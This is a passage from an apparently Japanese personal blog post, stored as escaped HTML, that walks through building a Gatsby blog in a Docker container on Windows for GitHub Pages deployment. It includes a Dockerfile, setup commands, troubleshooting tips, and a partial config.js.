&lt;p&gt;参考：&lt;a href=&quot;https://typora.io/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Typora&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;デプロイ環境&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%97%E3%83%AD%E3%82%A4%E7%92%B0%E5%A2%83&quot; aria-label=&quot;デプロイ環境 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デプロイ環境&lt;/h3&gt;
&lt;p&gt;ローカルで作成したブログは、GitHub Pagesにデプロイして公開します。&lt;/p&gt;
&lt;p&gt;この際、独自ドメインを使用して公開できるように構成します。&lt;/p&gt;
&lt;h2 id=&quot;gatsby環境を構築する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gatsby%E7%92%B0%E5%A2%83%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;gatsby環境を構築する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Gatsby環境を構築する&lt;/h2&gt;
&lt;h3 id=&quot;dockerをインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#docker%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;dockerをインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dockerをインストールする&lt;/h3&gt;
&lt;p&gt;現在Windows環境にDockerをインストールする方法としては、以下の2つの方法が主になると思います。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WSL2にDockerをインストールする&lt;/li&gt;
&lt;li&gt;Docker Desktop for Windowsをインストールする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.docker.com/desktop/windows/install/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Install Docker Desktop on Windows | Docker Documentation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回はPowershellからDockerコマンドを実行していく予定なので、Docker Desktop for Windowsをインストールしました。&lt;/p&gt;
&lt;p&gt;ちなみに、Docker Desktop for Windowsは少し前にライセンス有料化で話題になりましたが、個人利用の場合は引き続き無料で使用することができます。&lt;/p&gt;
&lt;p&gt;インストール方法については上記のドキュメントのリンクからダウンロードしたインストーラを実行するだけでOKです。&lt;/p&gt;
&lt;h3 id=&quot;gatsby開発用のコンテナを作成する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gatsby%E9%96%8B%E7%99%BA%E7%94%A8%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;gatsby開発用のコンテナを作成する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Gatsby開発用のコンテナを作成する&lt;/h3&gt;
&lt;p&gt;続いてGatsbyの開発環境を構築します。&lt;/p&gt;
&lt;p&gt;基本的には以下のドキュメントを参照し、次のようなDockerfileを作成しました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.gatsbyjs.com/docs/tutorial/part-0/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Part 0: Set Up Your Development Environment | Gatsby&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; ubuntu:20.04&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;ENV&lt;/span&gt; TZ=Asia/Tokyo&lt;/span&gt;

&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; mkdir -p /app/blog&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;ENV&lt;/span&gt; HOME=/app/&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; /app&lt;/span&gt;

&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt update &amp;amp;&amp;amp; apt upgrade -y&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt install tzdata -y&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt install curl git python wget -y&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt install nodejs npm -y&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; npm install n -g&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; n stable&lt;/span&gt;

&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt purge -y nodejs npm&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; apt autoremove -y&lt;/span&gt;

&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; node -v&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; npm install -g gatsby-cli&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; npm install gh-pages --save-dev&lt;/span&gt;

&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; chown root:root ./* -R&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$HOME&lt;/span&gt;/blog&lt;/span&gt;
&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;EXPOSE&lt;/span&gt; 8000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ubuntu 20.04のコンテナをベースに最新のNodeJSをインストールした後、&lt;code class=&quot;language-text&quot;&gt;gatsby-cli&lt;/code&gt;をインストールしました。&lt;/p&gt;
&lt;p&gt;これによって&lt;code class=&quot;language-text&quot;&gt;gatsby&lt;/code&gt;コマンドが使用できるようになります。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;gh-pages&lt;/code&gt;はGithub Pagesにデプロイする際に使用するパッケージです。&lt;/p&gt;
&lt;p&gt;詳細は後述します。&lt;/p&gt;
&lt;p&gt;なお、今回作成したイメージは&lt;a href=&quot;https://hub.docker.com/repository/docker/kashiwabayuki/gatsby-env&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kashiwabayuki/gatsby-env&lt;/a&gt;として公開しているので、以下のコマンドでPullすることも可能です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;docker&lt;/span&gt; pull kashiwabayuki/gatsby-env&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;gatsbyブログの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gatsby%E3%83%96%E3%83%AD%E3%82%B0%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;gatsbyブログの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Gatsbyブログの作成&lt;/h3&gt;
&lt;p&gt;コンテナイメージを作成した後、環境構築時のみコンテナにログインしていくつかのセットアップを実行する必要があります。&lt;/p&gt;
&lt;p&gt;Powershell環境の場合、以下のコマンドでコンテナにログインできます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$pwddir&lt;/span&gt; = &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Get-Location&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;PSProvider FileSystem&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Path
docker run &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;it &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;volume &lt;span class=&quot;token variable&quot;&gt;$pwddir&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;src:&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;app &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;p 8000:8000 kashiwabayuki/gatsby-env&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このコマンドで、コンテナのホームディレクトリ&lt;code class=&quot;language-text&quot;&gt;/app&lt;/code&gt;にローカルボリューム&lt;code class=&quot;language-text&quot;&gt;src/&lt;/code&gt;を紐づけてログインしています。&lt;/p&gt;
&lt;p&gt;ログイン後、以下のコマンドで&lt;code class=&quot;language-text&quot;&gt;gatsby-starter-lumen&lt;/code&gt;を使用してGatsbyのコンテンツを作成します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;gatsby new blog https://github.com/alxshelepenok/gatsby-starter-lumen&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて、新たに生成された&lt;code class=&quot;language-text&quot;&gt;blog&lt;/code&gt;ディレクトリ配下で以下のコマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;npm&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;#もしエラーになる場合は npm install --legacy-peer-deps を実行する。&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;npm install&lt;/code&gt;コマンドでエラーが発生する場合は&lt;code class=&quot;language-text&quot;&gt;--legacy-peer-deps&lt;/code&gt;オプションを付けてから実行してみると良いです。&lt;/p&gt;
&lt;p&gt;これでブログの初期設定は完了です。&lt;/p&gt;
&lt;p&gt;以下のコマンドを実行してローカルサーバが起動すれば成功です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;gatsby develop -H &lt;span class=&quot;token number&quot;&gt;0.0&lt;/span&gt;.0.0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;トラブルシューティングeacces-permission-denied-mkdir-appnpmsentry-cli-が発生する場合&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0eacces-permission-denied-mkdir-appnpmsentry-cli-%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88&quot; aria-label=&quot;トラブルシューティングeacces permission denied mkdir appnpmsentry cli が発生する場合 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;トラブルシューティング：EACCES: permission denied, mkdir ‘/app/.npm/sentry-cli’ が発生する場合&lt;/h3&gt;
&lt;p&gt;再現条件が不定なので原因はよくわかっていないのですが、&lt;code class=&quot;language-text&quot;&gt;npm install&lt;/code&gt; を実行した際に&lt;code class=&quot;language-text&quot;&gt;EACCES: permission denied, mkdir &apos;/app/.npm/sentry-cli&apos;&lt;/code&gt;という権限エラーが発生する場合があります。&lt;/p&gt;
&lt;p&gt;Dockerのユーザはrootにしているので通常発生しないことが想定されるのですが、僕の環境では何度か発生しました。&lt;/p&gt;
&lt;p&gt;対処方としては、Dockerfileでエラーの発生するディレクトリに以下のように明示的に所有者をrootに設定してあげると解消されました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token instruction&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; chown root:root ./* -R&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;エラーが発生しないときもあるので、原因は正直よくわかっていないです。。&lt;/p&gt;
&lt;h3 id=&quot;トラブルシューティングsocialimageのエラーが発生する場合&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0socialimage%E3%81%AE%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88&quot; aria-label=&quot;トラブルシューティングsocialimageのエラーが発生する場合 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;トラブルシューティング：socialImageのエラーが発生する場合&lt;/h3&gt;
&lt;p&gt;ちなみに、この時以下のようなエラーが発生する場合があります。&lt;/p&gt;
&lt;p&gt;これは、各記事の&lt;code class=&quot;language-text&quot;&gt;socialImage&lt;/code&gt;の値が空になっているか、参照先の画像が存在していない場合、もしくは&lt;code class=&quot;language-text&quot;&gt;static&lt;/code&gt;ディレクトリが解決できない場合に発生するようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;Field &lt;span class=&quot;token string&quot;&gt;&quot;socialImage&quot;&lt;/span&gt; must not have a selection since &lt;span class=&quot;token builtin class-name&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;String&quot;&lt;/span&gt; has no subfields.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;本記事の手順の場合は問題ないですが、Windowsのホスト上で&lt;code class=&quot;language-text&quot;&gt;gatsby develop&lt;/code&gt;を実行した場合、&lt;code class=&quot;language-text&quot;&gt;static&lt;/code&gt;ディレクトリが解決できない既知の問題のためこのような問題が発生する場合があります。&lt;/p&gt;
&lt;p&gt;解決のためには、以下のIssueに記載の回避策を試すか、本記事に記載のコンテナイメージを利用してください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/alxshelepenok/gatsby-starter-lumen/issues/761&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Field “socialImage” must not have a selection since type “String” has no subfields. · Issue #761 · alxshelepenok/gatsby-starter-lumen&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;gatsbyの設定を変更する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#gatsby%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot; aria-label=&quot;gatsbyの設定を変更する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Gatsbyの設定を変更する&lt;/h2&gt;
&lt;p&gt;とりあえずここまでで最低限のGatsby環境が出来上がったので、次は初期セットアップを行っていきます。&lt;/p&gt;
&lt;h3 id=&quot;プロフィール設定を変更する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%95%E3%82%A3%E3%83%BC%E3%83%AB%E8%A8%AD%E5%AE%9A%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot; aria-label=&quot;プロフィール設定を変更する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロフィール設定を変更する&lt;/h3&gt;
&lt;p&gt;基本的なプロフィールやSNSなどの設定は&lt;code class=&quot;language-text&quot;&gt;blog/config.js&lt;/code&gt;から変更できます。&lt;/p&gt;
&lt;p&gt;実際の設定は以下のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token string&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

module&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exports &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;https://kashiwaba-yuki.com&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;pathPrefix&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;かえるのひみつきち&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;subtitle&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;copyright&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;All rights reserved 2022 Kaeru-no-Himitsukichi.&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;disqusShortname&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;postsPerPage&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;googleAnalyticsId&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;useKatex&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token literal-property property&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;All Articles&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token literal-property property&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/&apos;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
